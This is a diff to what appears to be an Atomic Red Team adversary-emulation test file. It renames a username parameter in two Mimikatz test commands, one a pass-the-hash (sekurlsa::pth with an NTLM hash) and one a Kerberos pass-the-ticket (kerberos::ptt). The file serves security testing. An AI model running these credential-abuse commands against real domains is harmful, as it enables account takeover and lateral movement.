@@ -12,7 +12,7 @@ atomic_tests:
     - windows
 
   input_arguments:
-    user:
+    user_name:
       description: username
       type: string
       default: Administrator
@@ -28,7 +28,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      mimikatz # sekurlsa::pth /user:#{user} /domain:#{domain} /ntlm:#{ntlm}
+      mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
 
 - name: Mimikatz Kerberos Ticket Attack
   description: |
@@ -40,4 +40,4 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      mimikatz # kerberos::ptt #{username}@#{Domain}
+      mimikatz # kerberos::ptt #{user_name}@#{domain}
